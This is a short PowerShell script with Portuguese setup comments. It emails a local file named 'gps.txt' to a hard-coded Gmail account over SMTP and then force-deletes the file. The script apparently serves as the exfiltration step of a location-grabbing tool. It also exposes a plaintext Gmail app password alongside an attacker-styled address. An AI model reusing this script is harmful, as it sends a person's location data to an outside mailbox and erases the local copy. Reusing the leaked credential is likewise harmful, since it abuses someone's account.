$s="smtp.gmail.com" :: Não mecher!
$p=587 :: Não mecher!
$u="d4rksy5t3myourbiggestfear@gmail.com" :: Coloque seu Gmail que queira Enviar as informações.
$pw="vqac qwvp szqu ygud" :: Coloque a senha do app do gmail colocado acima.
$f=$u :: Não mecher!
$t=$u :: Não mecher!
$j="Titulo" :: Titulo do Envio
$b="Descrição" Descrição do Envio
$a="gps.txt" :: NÃO MECHER NESSE, NOS QUE TÃO FALANDO PARA NÃO MECHER E EM DIANTE E MECHER NOS QUE TÃO FALANDO PARA COLOCAR GMAIL E SENHA DO APP DO GMAIL (Titulo e descrição também se quiser (Opcional))

$sec=ConvertTo-SecureString $pw -AsPlainText -Force
$cred=New-Object System.Management.Automation.PSCredential $u, $sec
$msg=New-Object System.Net.Mail.MailMessage
$msg.From=$f
$msg.To.Add($t)
$msg.Subject=$j
$msg.Body=$b
$msg.Attachments.Add($a)

$smtp=New-Object System.Net.Mail.SmtpClient($s,$p)
$smtp.EnableSsl=$true
$smtp.Credentials=$cred

try {
    $smtp.Send($msg)
    $msg.Dispose()
    Remove-Item -Path "gps.txt" -Force
} catch {
    Write-Output "Erro ao enviar email: $_"
}
